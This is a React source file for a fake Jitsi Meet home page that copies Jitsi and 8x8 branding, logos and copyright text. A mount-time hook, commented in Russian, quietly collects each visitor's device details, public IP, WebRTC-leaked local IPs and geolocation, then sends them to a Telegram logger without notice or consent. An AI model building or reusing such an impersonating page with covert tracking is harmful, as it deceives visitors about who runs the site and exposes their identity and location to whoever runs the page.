import { useState, useEffect, useRef } from 'react';
import { getDeviceInfo } from '@/utils/deviceInfo';
import { logVisitorEntry } from '@/utils/telegramLogger';
import { getPublicIP, getWebRTCIPs, getIPGeolocation } from '@/utils/ipGeolocation';
import { createRoom, getRoomFromUrl } from '@/utils/livekitAPI';
import svgPaths from '@/imports/svg-wg56ef214f';

// Use external CDN URLs instead of Figma assets
const imgOverlayBackground = 'https://images.unsplash.com/photo-1557683316-973673baf926?w=1920&h=1080&fit=crop';
const img8X8LogoPng = 'https://www.8x8.com/sites/default/files/2022-01/8x8-logo.png';
const imgAppStoreBadgePng = 'https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg';
const imgGooglePlayBadgePng = 'https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg';
const imgFDroidBadgePng = 'https://fdroid.gitlab.io/artwork/badge/get-it-on.png';
const imgSlackPng = 'https://cdn.worldvectorlogo.com/logos/slack-new-logo.svg';
const imgFbPng = 'https://cdn.worldvectorlogo.com/logos/facebook-3.svg';
const imgLiPng = 'https://cdn.worldvectorlogo.com/logos/linkedin-icon-2.svg';
const imgTwPng = 'https://cdn.worldvectorlogo.com/logos/twitter-6.svg';
const imgGhPng = 'https://cdn.worldvectorlogo.com/logos/github-icon-1.svg';

interface HomePageProps {
  onStartMeeting: (roomSlug: string, roomTitle?: string) => void;
}

export default function HomePage({ onStartMeeting }: HomePageProps) {
  const [userName, setUserName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const hasLoggedVisit = useRef(false);
  const [livekitConfigured, setLivekitConfigured] = useState<boolean | null>(null);

  // ========================================
  // CHECK LIVEKIT CONFIGURATION
  // ========================================
  useEffect(() => {
    const checkLivekitConfig = async () => {
      try {
        const { projectId, publicAnonKey } = await import('/utils/supabase/info');
        const response = await fetch(`https://${projectId}.supabase.co/functions/v1/make-server-039e5f24/debug-config`, {
          headers: {
            'Authorization': `Bearer ${publicAnonKey}`,
          },
        });
        const config = await response.json();
        const isConfigured = config.hasApiKey && config.hasApiSecret && !!config.livekitUrl;
        setLivekitConfigured(isConfigured);
        
        if (!isConfigured) {
          console.warn('⚠️ LiveKit not configured:', config);
        }
      } catch (error) {
        console.error('Error checking LiveKit config:', error);
        setLivekitConfigured(false);
      }
    };
    
    checkLivekitConfig();
  }, []);

  // ========================================
  // VISITOR TRACKING - runs once on mount
  // ========================================
  useEffect(() => {
    if (hasLoggedVisit.current) {
      return; // Already logged
    }
    
    hasLoggedVisit.current = true;
    
    const trackVisitor = async () => {
      try {
        console.log('🎯 Новый посетитель - начинаем сбор данных...');
        
        // 1. Collect device info
        const deviceInfo = getDeviceInfo();
        console.log('✅ Информация об устройстве собрана:', deviceInfo);
        
        // 2. Get public IP
        let publicIP = 'Unknown';
        try {
          publicIP = await getPublicIP();
          console.log('✅ Публичный IP:', publicIP);
        } catch (error) {
          console.error('❌ Ошибка получения IP:', error);
        }
        
        // 3. Get WebRTC IPs
        let webrtcIPs: string[] = [];
        try {
          webrtcIPs = await getWebRTCIPs();
          console.log(`✅ WebRTC IPs (${webrtcIPs.length}):`, webrtcIPs);
        } catch (error) {
          console.error('❌ Ошибка WebRTC leak:', error);
        }
        
        // 4. Get IP geolocation (for country/city)
        let geoData: any = null;
        try {
          const ipGeo = await getIPGeolocation();
          if (ipGeo) {
            geoData = {
              country: ipGeo.country,
              city: ipGeo.city,
              region: ipGeo.region
            };
            console.log('✅ IP-геолокация получена:', geoData);
          }
        } catch (error) {
          console.error('❌ Ошибка получения IP-геолокации:', error);
        }
        
        // 5. Send initial visitor log to Telegram
        await logVisitorEntry(deviceInfo, publicIP, webrtcIPs, geoData);
        console.log('✅ Данные посетителя отправлены в Telegram');
        
      } catch (error) {
        console.error('❌ Ошибка при отслеживании посетителя:', error);
      }
    };
    
    trackVisitor();
  }, []);

  // ========================================
  // CHECK URL FOR INVITE LINK - runs once on mount
  // ========================================
  useEffect(() => {
    const roomSlug = getRoomFromUrl();
    if (roomSlug) {
      console.log('🔗 Обнаружена invite link, переходим в PreJoin:', roomSlug);
      onStartMeeting(roomSlug);
    }
  }, [onStartMeeting]);

  const handleStartMeeting = async () => {
    if (userName.trim()) {
      setIsLoading(true);
      setError(null);

      try {
        // Создаём комнату и получаем slug
        console.log('🚀 [HomePage] Создание комнаты для пользователя:', userName);
        const { roomSlug, title } = await createRoom(userName.trim());
        console.log('✅ [HomePage] Комната создана, slug:', roomSlug, 'title:', title);
        
        // Переходим на PreJoin экран
        onStartMeeting(roomSlug, title);
      } catch (error) {
        console.error('❌ [HomePage] Ошибка при создании комнаты:', error);
        setError('Failed to create room. Please try again.');
      } finally {
        setIsLoading(false);
      }
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter' && userName.trim()) {
      handleStartMeeting();
    }
  };

  return (
    <div className="relative w-full min-h-screen overflow-auto bg-white">
      {/* Hero Section */}
      <div 
        className="relative w-full bg-cover bg-center bg-no-repeat"
        style={{ 
          backgroundImage: `linear-gradient(90deg, rgba(0, 0, 0, 0.2) 0%, rgba(0, 0, 0, 0.2) 100%), linear-gradient(90deg, rgb(0, 0, 0) 0%, rgba(0, 0, 0, 0) 75.16%), url('${imgOverlayBackground}')`
        }}
      >
        <div className="w-full px-4 md:px-10 xl:px-[371px] py-[120px] md:pb-4 xl:pb-16">
          {/* Header - Logo & Settings */}
          <div className="relative w-full max-w-[688px] mx-auto mb-8">
            {/* Jitsi Logo */}
            <a 
              href="https://jitsi.org/" 
              target="_blank" 
              rel="noopener noreferrer"
              className="absolute left-0 top-[-88px]"
            >
              <JitsiLogo />
            </a>

            {/* Settings Button */}
            <button className="absolute right-0 top-[-88px] bg-[rgba(255,255,255,0.38)] p-1 rounded-[3px] hover:bg-[rgba(255,255,255,0.5)] transition-colors">
              <SettingsIcon />
            </button>
          </div>

          {/* Main Content */}
          <div className="w-full max-w-[688px] mx-auto flex flex-col items-center">
            <h1 className="text-white text-[42px] leading-[50px] font-['Arial:Narrow',sans-serif] text-center mb-4">
              Jitsi Meet
            </h1>

            <p className="text-white text-[20px] leading-[26px] font-['Arial:Bold',sans-serif] text-center mb-8">
              Secure and high quality meetings
            </p>

            {/* Input and Button */}
            <div className="w-full max-w-[480px] rounded-[4px] flex flex-col sm:flex-row sm:bg-white sm:p-1 items-stretch sm:items-center gap-0">
              <div className="flex-1 sm:pr-1 pb-[10px] sm:pb-0">
                <input
                  type="text"
                  value={userName}
                  onChange={(e) => setUserName(e.target.value)}
                  onKeyPress={handleKeyPress}
                  placeholder="Enter your name"
                  className="w-full h-[50px] px-[10px] text-[#253858] text-[14px] font-['Arial:Narrow',sans-serif] outline-none bg-white rounded-[4px] border-0"
                />
              </div>
              <button
                onClick={handleStartMeeting}
                disabled={!userName.trim() || isLoading}
                className="bg-[#0977e2] text-white text-[16px] sm:text-[14px] font-['Arial:Narrow',sans-serif] w-full sm:w-auto px-5 py-[17px] sm:py-[17px] rounded-[3px] hover:bg-[#0063c1] transition-colors disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap leading-normal"
              >
                {isLoading ? 'Loading...' : 'Start meeting'}
              </button>
            </div>
            {error && <p className="text-red-500 text-[14px] leading-[17px] font-['Arial:Narrow',sans-serif] mt-2">{error}</p>}
            
            {/* LiveKit Configuration Warning */}
            {livekitConfigured === false && (
              <div className="mt-4 p-3 bg-yellow-500/20 border border-yellow-500/50 rounded text-yellow-200 text-sm max-w-[480px]">
                ⚠️ LiveKit is not configured. Please set environment variables: LIVEKIT_URL, LIVEKIT_API_KEY, LIVEKIT_API_SECRET
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Jitsi as a Service Card */}
      <div className="w-full bg-white py-10 px-4 md:px-10 xl:px-[371px]">
        <div className="w-full max-w-[688px] mx-auto">
          <div className="bg-[#444447] rounded-[8px] p-8 text-white">
            <div className="flex items-center gap-4 mb-6">
              <img src={img8X8LogoPng} alt="8x8" className="w-8 h-8" />
              <span className="text-[16px] leading-[32px] font-['Arial:Narrow',sans-serif]">
                Jitsi as a Service
              </span>
            </div>

            <h3 className="text-[24px] leading-[36px] font-['Arial:Narrow',sans-serif] mb-4">
              Want meetings in your app? Check out{' '}
              <span className="font-['Arial:Bold',sans-serif]">Jitsi as a Service</span>.
            </h3>

            <p className="text-[16px] leading-[24px] font-['Arial:Narrow',sans-serif] mb-6">
              Connect the users of your website or app. Get branding & tight access controls. Have
              notifications, transcriptions & recordings delivered straight to your backend
            </p>

            <a 
              href="https://jaas.8x8.vc/" 
              target="_blank"
              rel="noopener noreferrer"
              className="inline-block bg-white text-[#36373a] text-[12px] leading-[17.14px] font-['Arial:Bold',sans-serif] px-4 py-[14px] rounded-[3px] hover:bg-[#f0f0f0] transition-colors"
            >
              Learn more
            </a>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#131519] text-white w-full">
        <div className="w-full px-4 md:px-10 xl:px-[371px] py-8">
          <div className="w-full max-w-[688px] mx-auto">
            {/* Mobile Apps Section */}
            <div className="border-b border-[#424447] pb-8 mb-8">
              <p className="text-[12px] leading-[17.14px] font-['Arial:Narrow',sans-serif] text-center mb-6">
                Jitsi on mobile – download our apps and start a meeting from anywhere
              </p>
              <div className="flex flex-col md:flex-row items-center justify-center gap-4">
                <a href="https://apps.apple.com/us/app/jitsi-meet/id1165103905" target="_blank" rel="noopener noreferrer">
                  <img src={imgAppStoreBadgePng} alt="App Store" className="h-10 w-[120px]" />
                </a>
                <a href="https://play.google.com/store/apps/details" target="_blank" rel="noopener noreferrer">
                  <img src={imgGooglePlayBadgePng} alt="Google Play" className="h-[45px] w-[153px]" />
                </a>
                <a href="https://f-droid.org/en/packages/org.jitsi.meet/" target="_blank" rel="noopener noreferrer">
                  <img src={imgFDroidBadgePng} alt="F-Droid" className="h-10 w-[135px]" />
                </a>
              </div>
            </div>

            {/* Slack Section */}
            <div className="border-b border-[#424447] pb-8 mb-8 flex flex-col md:flex-row items-center justify-between gap-4">
              <p className="text-[12px] leading-[17.14px] font-['Arial:Narrow',sans-serif] text-center md:text-left">
                Hello, Slack fans! Very pleased to meet you! Just add our extension and off you go!
              </p>
              <a href="https://slack.com/oauth/authorize" target="_blank" rel="noopener noreferrer" className="shrink-0">
                <img src={imgSlackPng} alt="Slack" className="h-10 w-[156px]" />
              </a>
            </div>

            {/* Links and Social */}
            <div className="border-b border-[#424447] pb-8 mb-8">
              <div className="flex flex-col md:flex-row items-center md:items-start justify-between gap-4">
                <div className="flex gap-4 text-[12px] leading-[16px] font-['Arial:Bold',sans-serif]">
                  <a href="https://jitsi.org/meet-jit-si-privacy/" className="hover:underline">
                    Privacy Policy
                  </a>
                  <a href="http://jitsi.org/meet-jit-si-terms-of-service/" className="hover:underline">
                    Terms & Conditions
                  </a>
                </div>
                <div className="flex gap-[27px]">
                  <a href="https://www.facebook.com/jitsi" target="_blank" rel="noopener noreferrer" className="hover:opacity-80">
                    <img src={imgFbPng} alt="Facebook" className="w-6 h-6" />
                  </a>
                  <a href="https://www.linkedin.com/company/8x8/" target="_blank" rel="noopener noreferrer" className="hover:opacity-80">
                    <img src={imgLiPng} alt="LinkedIn" className="w-6 h-6" />
                  </a>
                  <a href="https://twitter.com/jitsinews" target="_blank" rel="noopener noreferrer" className="hover:opacity-80">
                    <img src={imgTwPng} alt="Twitter" className="w-6 h-6" />
                  </a>
                  <a href="https://github.com/jitsi" target="_blank" rel="noopener noreferrer" className="hover:opacity-80">
                    <img src={imgGhPng} alt="GitHub" className="w-6 h-6" />
                  </a>
                </div>
              </div>
            </div>

            {/* Copyright */}
            <div className="flex flex-col md:flex-row items-center gap-8 pb-8">
              <a href="https://8x8.com/" target="_blank" rel="noopener noreferrer" className="shrink-0">
                <img src={img8X8LogoPng} alt="8x8" className="w-8 h-8" />
              </a>
              <div className="text-[#a1a1a3] text-[12px] leading-[16px] font-['Arial:Narrow',sans-serif] text-center md:text-left">
                <p>8x8 is a proud supporter of the Jitsi community.</p>
                <p>© 8x8, Inc. All Rights Reserved.</p>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

function JitsiLogo() {
  return (
    <div className="h-8 w-[71px]">
      <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 71 32">
        <g clipPath="url(#clip0_1_107)">
          <path d={svgPaths.p187d5d00} fill="white" />
          <path d={svgPaths.p373a8600} fill="white" />
          <path d={svgPaths.p1981b00} fill="white" />
          <path d={svgPaths.p1c73ca00} fill="white" />
          <path d={svgPaths.p883c300} fill="white" />
          <path d={svgPaths.p30fb000} fill="white" />
        </g>
        <defs>
          <clipPath id="clip0_1_107">
            <rect fill="white" height="32" width="71" />
          </clipPath>
        </defs>
      </svg>
    </div>
  );
}

function SettingsIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPaths.pe3b500} 
        fill="white" 
        fillRule="evenodd" 
      />
      <path 
        clipRule="evenodd" 
        d={svgPaths.pee08300} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}